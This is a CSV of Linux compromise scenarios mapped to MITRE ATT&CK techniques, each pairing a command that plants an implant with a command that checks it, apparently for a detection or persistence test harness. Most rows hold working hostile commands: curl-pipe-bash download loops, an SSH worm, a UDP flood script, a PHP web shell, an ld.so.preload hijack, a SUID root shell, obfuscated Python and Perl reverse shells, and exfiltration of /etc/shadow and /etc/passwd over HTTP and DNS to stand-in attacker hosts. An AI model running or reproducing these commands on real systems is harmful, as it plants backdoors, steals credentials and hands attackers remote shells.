Scenario_ID,MITRE_ATT&CK_ID,ATT&CK_Technique,Category,Persistence_Mechanism,Session_A_(Implant),Session_B_(Verify),Keywords
HC-T1105-001,T1105,Ingress Tool Transfer,Payload Stagers,curl|sh download loop with nohup,"echo ""#!/bin/bash"" > /var/tmp/.cache_update && echo ""nohup bash -c 'while true; do curl -s http://drop.malware.net/gafgyt | bash; sleep 600; done' &"" >> /var/tmp/.cache_update && chmod +x /var/tmp/.cache_update",cat /var/tmp/.cache_update,drop.malware.net; gafgyt
HC-T1071-001,T1071,Application Layer Protocol,C2 Implants,Deploy Perl IRC bot under hidden path,"mkdir -p /dev/shm/.x && echo ""#!/usr/bin/perl"" > /dev/shm/.x/bot.pl && echo ""# IRC Bot Config"" >> /dev/shm/.x/bot.pl && echo ""my \$server = \""irc.undernet.org\"";"" >> /dev/shm/.x/bot.pl && echo ""my \$channel = \""#botnet-cmd\"";"" >> /dev/shm/.x/bot.pl && echo ""my \$nick = \""bot_\"".int(rand(9999));"" >> /dev/shm/.x/bot.pl",cat /dev/shm/.x/bot.pl,irc.undernet.org; #botnet-cmd
HC-T1499-001,T1499,Endpoint Denial of Service,Payload Stagers,Install UDP flood launcher script,"echo ""#!/bin/bash"" > /opt/.ddos && echo ""# UDP Flood Tool"" >> /opt/.ddos && echo ""TARGET=\$1; PORT=\$2; DURATION=\$3"" >> /opt/.ddos && echo ""timeout \$DURATION bash -c \""while true; do echo x > /dev/udp/\$TARGET/\$PORT; done\"""" >> /opt/.ddos && chmod +x /opt/.ddos",cat /opt/.ddos,UDP Flood; /dev/udp
HC-T1021-004,T1021.004,Remote Services: SSH,Lateral Spread,Drop sshpass-based propagation script,"echo ""#!/bin/bash"" > /tmp/.spread.sh && echo ""for ip in \$(seq 1 254); do"" >> /tmp/.spread.sh && echo ""  sshpass -p \""admin123\"" ssh -o StrictHostKeyChecking=no root@192.168.1.\$ip \""wget http://c2.worm.net/payload -O /tmp/.worm && chmod +x /tmp/.worm && /tmp/.worm\"" &"" >> /tmp/.spread.sh && echo ""done"" >> /tmp/.spread.sh && chmod +x /tmp/.spread.sh",cat /tmp/.spread.sh,192.168.1.; c2.worm.net
HC-T1574-006v,T1574.006,Hijack Execution Flow: Dynamic Linker Hijacking (Variant),Execution Hijacks,Drop alternate preload library path,"touch /usr/local/lib/libsystem_helper.so && echo ""/usr/local/lib/libsystem_helper.so"" >> /etc/ld.so.preload",cat /etc/ld.so.preload && ls -la /usr/local/lib/libsystem_helper.so,libsystem_helper.so
HC-T1037-004v,T1037.004,Boot or Logon Initialization Scripts: RC Scripts (Variant),Auto-Start Hooks,Variant /etc/rc.local Python stager,"echo ""#!/bin/bash"" > /etc/rc.local && echo ""nohup /usr/bin/python3 -c \""import socket,subprocess;s=socket.socket();s.connect(('10.0.0.1',4444));subprocess.call(['bash','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\"" &"" >> /etc/rc.local && chmod +x /etc/rc.local",cat /etc/rc.local,10.0.0.1; 4444; socket
HC-T1505-003v,T1505.003,Server Software Component: Web Shell (Variant),Backdoor Implants,Variant hidden shell .error_handler.php,"mkdir -p /var/www/html && echo '<?php if(isset($_REQUEST[""c""])){system($_REQUEST[""c""]);} ?>' > /var/www/html/.error_handler.php",cat /var/www/html/.error_handler.php,_REQUEST; system
HC-T1548-001,T1548.001,Abuse Elevation Control: SUID/SGID,Access Footholds,Set SUID bit on a backdoor binary,cp /bin/bash /tmp/.rootshell && chmod u+s /tmp/.rootshell && ls -la /tmp/.rootshell,ls -la /tmp/.rootshell,.rootshell
HC-T1552-004,T1552.004,Unsecured Credentials: Private Keys,Credential/Data Theft,Stage harvested private keys for exfiltration,"find /home -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null && find /root -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null && cat /etc/ssh/ssh_host_rsa_key 2>/dev/null && echo ""# Stolen keys logged"" > /tmp/.keys_collected",cat /tmp/.keys_collected,Stolen keys
HC-T1552-001,T1552.001,Unsecured Credentials: Credentials in Files,Credential/Data Theft,Capture secrets from env/.env data,"env && echo ""AWS_ACCESS_KEY=EXFILTRATED"" > /tmp/.cloud_creds",cat /tmp/.cloud_creds,EXFILTRATED
HC-T1560-001,T1560,Archive Collected Data,Credential/Data Theft,Archive and stage sensitive files for exfiltration,"echo ""CONFIDENTIAL DATA: user_database_dump"" > /tmp/.exfil_data && echo ""tar czf - /etc/passwd /etc/shadow | base64 | curl -X POST -d @- http://exfil.evil.com/collect"" > /tmp/.exfil_script.sh && chmod +x /tmp/.exfil_script.sh",cat /tmp/.exfil_script.sh && cat /tmp/.exfil_data,exfil.evil.com; CONFIDENTIAL
HC-T1071-004,T1071.004,Application Layer Protocol: DNS,C2 Implants,Encode exfiltration into DNS lookups,"echo ""#!/bin/bash"" > /tmp/.dns_tunnel && echo ""# DNS exfiltration via subdomain encoding"" >> /tmp/.dns_tunnel && echo ""DATA=\$(cat /etc/passwd | base64 | tr -d '\n')"" >> /tmp/.dns_tunnel && echo ""for chunk in \$(echo \$DATA | fold -w 60); do nslookup \$chunk.data.evil-dns.com; done"" >> /tmp/.dns_tunnel && chmod +x /tmp/.dns_tunnel",cat /tmp/.dns_tunnel,evil-dns.com; base64
HC-T1036-004,T1036.004,Masquerading: Masquerade Task or Service,Stealth,Hide payloads as [kworker/0:1],"mkdir -p /dev/shm/.../.hidden && echo ""#!/bin/bash"" > /dev/shm/.../.hidden/rootkit.sh && echo ""# Hide from ps by renaming process"" >> /dev/shm/.../.hidden/rootkit.sh && echo ""exec -a '[kworker/0:1]' /bin/bash -c 'while true; do curl -s http://c2.rootkit.net/beacon; sleep 3600; done'"" >> /dev/shm/.../.hidden/rootkit.sh && chmod +x /dev/shm/.../.hidden/rootkit.sh",cat /dev/shm/.../.hidden/rootkit.sh,kworker; c2.rootkit.net
HC-T1059-001,T1059,Command and Scripting Interpreter,C2 Implants,Install Python/Perl reverse shell launchers,"echo 'python3 -c ""import os,socket,subprocess;s=socket.socket();s.connect((chr(49)+chr(48)+chr(46)+chr(48)+chr(46)+chr(48)+chr(46)+chr(49),5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([chr(98)+chr(97)+chr(115)+chr(104),chr(45)+chr(105)])""' > /tmp/.py_shell && echo 'perl -MSocket -e ""\$p=5556;socket(S,2,1,0);connect(S,pack_sockaddr_in(\$p,inet_aton(chr(49).chr(48).chr(46).chr(48).chr(46).chr(48).chr(46).chr(49))));open(STDIN,\"">&S\"");open(STDOUT,\"">&S\"");exec(chr(98).chr(97).chr(115).chr(104))""' > /tmp/.pl_shell",cat /tmp/.py_shell && cat /tmp/.pl_shell,10.0.0.1; 5555
